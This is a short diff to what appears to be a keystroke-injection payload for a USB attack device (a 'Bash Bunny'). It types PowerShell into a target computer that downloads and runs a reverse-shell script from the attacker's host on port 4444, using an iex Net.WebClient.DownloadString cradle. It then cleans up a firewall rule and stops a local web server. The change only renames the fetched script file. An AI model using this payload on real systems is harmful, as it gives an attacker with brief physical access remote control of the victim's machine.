@@ -43,7 +43,7 @@ Q ENTER
 Q DELAY 500
 Q STRING "\$I='$HOST_IP';\$P=4444;"
 Q DELAY 250
-Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/RevBunny.ps1\")"
+Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/bunnyz.ps1\")"
 Q DELAY 400
 Q ENTER
 
@@ -51,4 +51,3 @@ Q ENTER
 LED FINISH
 iptables -D OUTPUT -p udp --dport 53 -j DROP &>/dev/null
 pkill -f "python -m http.server 80" &>/dev/null
-                                                     
